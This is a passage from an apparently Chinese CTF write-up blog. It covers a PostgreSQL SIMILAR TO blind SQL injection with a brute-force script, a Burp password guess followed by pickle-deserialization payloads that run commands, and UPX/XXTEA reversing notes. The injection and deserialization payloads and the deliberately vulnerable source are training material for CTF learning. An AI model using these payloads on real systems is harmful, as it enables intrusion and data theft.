class="line">        sql.execute(create_sql)</span><br><span class="line">        sql.execute(<span class="string">&quot;SELECT COUNT(*) FROM company&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> sql.fetchall()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            sql.execute(<span class="string">&quot;INSERT INTO company (name) VALUES (&#x27;ikun&#x27;)&quot;</span>)</span><br><span class="line">            sql.execute(<span class="string">&quot;INSERT INTO company (name) VALUES (&#x27;man&#x27;)&quot;</span>)</span><br><span class="line">            sql.execute(<span class="string">&quot;INSERT INTO company (name) VALUES (&#x27;%s&#x27;)&quot;</span> % (flag))</span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/submit&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_form</span>():</span><br><span class="line">    conn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        conn = connect_database()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> username:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> white_list:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;你这名字有点奇怪emmm&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> forbidden_word <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> forbidden_word <span class="keyword">in</span> username.lower():</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;发现商业间谍，鸡毙你！！！&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> curr:</span><br><span class="line">            curr.execute(<span class="string">&quot;SELECT * FROM company WHERE name = &#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">            result = curr.fetchall()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;恭喜你，开启美好的一天吧&quot;</span>, <span class="number">200</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你是新来的员工吗，我怎么不认识你&quot;</span>, <span class="number">201</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> conn <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;打卡机&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body style=&quot;background-image: url(/static/i_like_work.jpg)&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;a&gt;勤劳的打工人，请输入名字进行上班打卡&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;/submit&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width: 80vw&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>根据提示</p><p>不是mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Postgresql</span><br></pre></td></tr></table></figure><p>打开实例后是这样的</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDc1MWNkNmE4NTQ5MTk1NjYxMDJhZmVkYjg5MjMxYjVfc25YSUh5ajI2QXhYOHhlNGFwZE5valRib1Z1YlMwcnNfVG9rZW46THdrMWJnRnNkb1BTQXV4dlhBWGNRYzNMbnN4XzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><code>SIMILAR TO</code>是PostgreSQL特有的模糊匹配操作符，其模式语法结合了<code>LIKE</code>的通配符（<code>%</code>、<code>_</code>）和正则表达式的元字符（如<code>|</code>、<code>()</code>、<code>[]</code>）。<a href="https://blog.csdn.net/qq_32838955/article/details/105466577?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&utm_relevant_index=9">Postgresql学习笔记之——模糊匹配LIKE、SIMILAR TO和POSIX正则表达式_sql similar to-CSDN博客</a></p><p>SQL通配符的应用<a href="https://www.runoob.com/sql/sql-wildcards.html">https://www.runoob.com/sql/sql-wildcards.html</a></p><p>利用脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://101.35.218.130:32887/submit&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;_&quot;</span></span><br><span class="line">words = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;- &quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#探测flag长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">    flag = <span class="string">&quot;_&quot;</span> * i</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;1&#x27; or name similar to &#x27;<span class="subst">&#123;flag&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;恭喜你&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        last_found_count=i</span><br><span class="line"></span><br><span class="line"><span class="comment">#探测flag</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,last_found_count+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> words:</span><br><span class="line">        res = requests.post(url,data=<span class="string">&quot;username=1&#x27; or name SIMILAR TO &#x27;&quot;</span> + (payload * (i - <span class="number">1</span>)) + j + (payload * (last_found_count - i)),headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;恭喜你&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>运行结果获得flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQyMTVlZjE4OWQ1ODcwOWNmYmI1Nzk4YjYwOGQxY2JfdjRWRk1SSHF6UVY5VEI4UXZpc2xsU0JFazlTNkxiWHpfVG9rZW46UFF6U2JuNHRXb0ZWU0N4U0pJNmNCQ3ZTbnRmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;45e30069-07f2-4026-b581-32058e8503fa&#125;</span><br></pre></td></tr></table></figure><h2 id="Py"><a href="#Py" class="headerlink" title="Py"></a>Py</h2><p>先看一下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, render_template, session</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#该文件位于/app/app.py</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">24</span>)</span><br><span class="line">FLAG = os.environ.get(<span class="string">&#x27;GZCTF_FLAG&#x27;</span>, <span class="string">&#x27;CTF&#123;test_flag&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;猜下密码&#x27;</span>:</span><br><span class="line">            session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Invalid!&quot;); location.href=&quot;/login&quot;;&lt;/script&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = request.form.get(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = pickle.loads(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;Data processed: <span class="subst">&#123;<span class="built_in">str</span>(result)&#125;</span>&#x27;</span>  <span class="comment"># 显示反序列化结果</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>登陆需要密码，可以尝试以下Burp Suite爆破，我们有字典</p><p>先添加payload</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTQ1NDI2NmU0NjNkNzIyYTQ0YzkyZmY3Zjg0YzZkMzZfTU9jRjd6cmtvWWtBUHBmendsajJEbGtrRmx1WTM4MmpfVG9rZW46WFE1SGJOZTNkb0NManB4MlBJTGNYZFZUbmZnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTMyMmQ5OWQxYzRiOGYyYjhhY2U4NGVmMWE4NjIxYWFfZktKZ01Da3FxNVo3a242UERnODZIQzBBbVR5b2huTmxfVG9rZW46VGI3bmJJcmQ2b2w5M0F4N0ZXR2NJOWZhbm5mXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWIyODMyNTNjNzgzNzFiZjY5MWJmMjBmY2QxNjI3ZWNfSmViYllheER6dnJadVo5RmVCSUlsNDVSTENqb21iWWNfVG9rZW46VDI2Y2JGTjhDb0VNNDR4ZW9uWWNPeWZJblliXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>得到密码为admin123</p><p>输入后得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjc5ZTgyZWU3ZDhhNGE2MmI2OTcxNDYxZmI3NTVhN2VfcUJQMFBiWHkyRDFndmJLT0dWbmU5b1BuZUVVZExYVUNfVG9rZW46Q1RqMGJiVzl5b2x1alp4c0p1Z2NDNThQbktiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzc2YzE1ZjM4ODUxM2Y2OTlhNWE0MGFhNGIzYzkyZDJfSzJjN0JSZGl3bzU2NGd4VnBkSnV3TGJoanJURFRXUDVfVG9rZW46UmFhbWIxZUIwb3ZCbm94RWQ3TGNqMFR5blhiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>看源码中，与pickle反序列化</p><p>我们可以通过构造恶意的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 读取环境变量并返回</span></span><br><span class="line">        <span class="keyword">return</span> (os.getenv, (<span class="string">&#x27;GZCTF_FLAG&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit()).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>这里也可以利用<code>subprocess</code>命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入必要的模块</span></span><br><span class="line"><span class="keyword">import</span> pickle    <span class="comment"># Python对象序列化模块（危险：反序列化时可执行任意代码）</span></span><br><span class="line"><span class="keyword">import</span> subprocess <span class="comment"># 用于执行系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个恶意类，利用pickle反序列化时自动调用的__reduce__方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        当对象被pickle反序列化时，此方法会被调用</span></span><br><span class="line"><span class="string">        返回一个元组：(可调用对象, 参数元组)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 返回subprocess.check_output函数和它的参数</span></span><br><span class="line">        <span class="comment"># 参数是一个命令列表：[&quot;printenv&quot;, &quot;GZCTF_FLAG&quot;]</span></span><br><span class="line">        <span class="comment"># 这个命令会打印环境变量GZCTF_FLAG的值</span></span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output, ([<span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;GZCTF_FLAG&quot;</span>],))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成恶意payload</span></span><br><span class="line"><span class="comment"># 1. 创建Exploit对象</span></span><br><span class="line"><span class="comment"># 2. pickle.dumps将其序列化为字节流</span></span><br><span class="line"><span class="comment"># 3. .hex()将字节流转换为十六进制字符串（便于传输或存储）</span></span><br><span class="line">payload = pickle.dumps(Exploit()).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出payload（十六进制形式）</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>依旧可以实现</p><p>得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTVmODg5YTZjMmQ4ZGU2YTg1ZjRmNGE5MDgzMWQ2Y2VfZlpveW93UUUyOUR1dHkzUE42OFhBbGV0RGg1S0l2T1FfVG9rZW46S1BhSmJGTDd3b0o5Qll4UGc3Z2NFazBXbk9kXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80049522000000000000008c026f73948c06676574656e769493948c0a475a4354465f464c414794859452942e</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY0NWZkMzFlMzRjN2VjMzViNTMxYzQxMDVkNmUxZTFfSTY3QnNhUWdGeVRSRGhXSTVKa0dhZGZnZnJHb0F1dE9fVG9rZW46S0FiaGJ5MEx0b0xFaTh4UUo2MGNDa0NnblJnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>获得flag<code>QLNU&#123;a1fa2161-e736-4f91-9a50-596a0cc6f049&#125;</code></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Fly-Bird"><a href="#Fly-Bird" class="headerlink" title="Fly_Bird"></a>Fly_Bird</h2><p>先用die查一下，发现是用upx包裹的32位</p><p>所以先用upx脱壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWMwNWQ5NTcwZWM3MDE3OTQ0YzZiZjRhNjE4NWM0OWJfeXM3R0hrNmxLblVONVlNd0dWNzVMNlN0ZG4zMUZpS3pfVG9rZW46QVF4VGJiZnVrb0RSTWV4b25FS2NpWHJxbkpiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWJlNTNhMDY2YmJhYmVmYmNkY2ExNzNhMDk0NjMwOGVfYXVTTnZXdHZzeGRCNG9xbHltVHlQR3RpWjBwanJtdm9fVG9rZW46T0Y4dGJCcTVHb3Rpakh4dERLeGNZUDJkbkVjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>这样就脱壳完成了，</p><p>再将其拖进ida，就能找到flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YzliMWE0NjRhNDRlZmU4MjFmNmQyZTJkNTAwNDNhMzFfQjVUck1CS3hCVzBDV3gzOWp6QXYwUFhiSHM5ZjI4VldfVG9rZW46WVk5Q2JWdUgwb1RxNGx4bFRpTmNYY1E3bkJlXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;no_pain_no_gains&#125;</span><br></pre></td></tr></table></figure><h2 id="茶（promax版）"><a href="#茶（promax版）" class="headerlink" title="茶（promax版）"></a>茶（promax版）</h2><p>解压附件后是一个exe的格式文件，用die打开后发现有一处被魔改的upx</p><p>壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2U3YWNmZTE3MjQ4YWM0ODU2ZWUwMzE1NWEzZDFkMzFfbEhnZ055bDR3WUVnQXBZUXVneWhsajR2TVBxMWJkaUlfVG9rZW46Q1hWUmJ1Q3Jrb3U5SXh4b2Ryc2NrZUE4bm9mXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>接下来用010打开，进行修改</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzFkYjRiNzZkODY0YmFjZTgwM2I2MzNlY2ZjNWFmOTVfTWtDRzRGQWUyUlU5UUl5TGxBcFpyeGZpclBpZkdYSGhfVG9rZW46TG1iWWJwOVpsbzBiVXF4NFZ3Y2NoUURJbmpWXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODlkNzBlYzcxNDRmYzI5OThiNGU3OTk1NjAzNzg3NDlfbHpsdHVISHdYVGlVR1JQSHhvSWhuYmFaZGhvTDJhaVdfVG9rZW46Q205NWJZRWIzb21Ddm54bkdKS2NTdGZablhjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>保存后重新用die打开</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDhiM2VhY2IzYmYyMjQxYWZiYjU1MzhiZmZkZGY1MmJfZnhJZ1FuZEt2MmcxMFpPckhxd3ZBREN0NWtBRXAyTEpfVG9rZW46VHd6NGJ6NzI1b0NUc0Z4Zkg1RWMyWDdpbjVlXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>一个普通的upx壳，进行脱壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE5ZWUyOGE1NmE0ZjFiMGRiMGRlMWM1OWE5MmRmOGVfVEg4QmU5YWpKcWp2MDBTYnpQVXVBNUZzVWt3U2pIVTBfVG9rZW46UFI3QmI5ZURVb0N1YUx4STBlY2NBakplbktkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>这样就脱壳成功了，接下来我们就可以把它放进ida中进行分析</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDcyYTE3MWI0Y2U1ZWU4ODU1ODZjNGE2NmVhN2YxNzhfeUhyOVVabzVkVzV5UmJsajFYWTF4ZTNoc0F2MHVURkpfVG9rZW46SDkwMmJlYlFlbzlNRE14OExEbmNrZVMxbmdjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>查看unk_405020的输入内容</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRlNDE5YWVjZmU1ZDRiY2JjYmQwY2FmOTRhYTM4Y2RfdFlwRG5DM1l0cFNYTjY0b2t1RUkxMDM1TkhQM1hvZDVfVG9rZW46SmFLOWIyWE1IbzE1VEh4R1lmT2NBY0p5blRnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDc2Y2JmNGZkZmVhY2ZiZGZmYjIxMmVjNzg0Y2Y3YzJfbjBYWUh2cEhtRGZlN3c3OThONEdOR2pFNzYyeDZRQTlfVG9rZW46UFRsSWJFbDRHb2NUdkx4ZjZzeWNkSmRFbkVnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>看enc加密函数</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2EyNjA4Y2I2OGVlOTIxN2JiOGFjODViNmUwMTdkYzRfTWk1OVVSQkQwZUhPSTU0eGxOTmV2WDRtdWRsd2ppRWFfVG9rZW46SEpheGJJTmpFbzR3SEx4cGhaU2NYb0M2bmRSXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><ul><li>代码中 <code>sum -= 1640531527</code>：<ul><li><code>1640531527</code> 的十六进制是 <code>0x61C88647</code>，它是 <code>0x9E3779B9</code> 的补码表示（即 <code>-0x61C88647 = 0x9E3779B9</code>）。</li><li>这是 <strong>XXTEA&#x2F;TEA家族算法</strong> 的标志性常量。</li></ul></li></ul><p>利用脚本解决这个问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> 